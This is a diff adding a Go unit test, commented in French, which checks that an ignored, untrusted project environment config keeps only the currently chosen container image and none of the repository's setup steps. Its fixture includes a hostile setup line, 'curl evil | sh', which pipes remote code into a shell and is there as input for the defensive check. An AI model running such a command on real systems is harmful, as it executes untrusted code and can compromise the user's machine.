@@ -270,3 +270,27 @@ func TestSafeTerminalTextBidiEtInvisibles(t *testing.T) {
 		t.Errorf("SafeTerminalText = %q", got)
 	}
 }
+
+// Projet cloné en exécution hôte, « ignoré » sans socle, puis passé en conteneur (F2) : le socle choisi ensuite est pris
+// en compte (pas de blocage « image manquante »), sans rien reprendre d'autre du dépôt.
+func TestIgnoreSansSocleEtF2ConteneurPrendLeSocleCourant(t *testing.T) {
+	d := trustProject(t, "image: debian:12\nsetup:\n  - curl evil | sh\n")
+	_, _ = MarkEnvPending(d, "https://github.com/a/b.git", "") // hôte : aucun socle choisi à la création
+	info, _ := EnvTrustInfoFor(d)
+	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := LoadEnv(d); err == nil {
+		t.Fatal("ignoré sans socle : une erreur « image manquante » est attendue tant qu'aucun socle n'est choisi")
+	}
+	if err := ApplyExec(d, "fedora:40", "srv1"); err != nil { // F2 : conteneur
+		t.Fatal(err)
+	}
+	e, err := LoadEnv(d)
+	if err != nil || e.Image != "fedora:40" || len(e.Setup) != 0 {
+		t.Fatalf("socle courant attendu seul : %+v %v", e, err)
+	}
+	if EnvTrust(d) != TrustIgnored {
+		t.Errorf("état = %s, ignored attendu (écriture du launcher : pas de re-demande)", EnvTrust(d))
+	}
+}
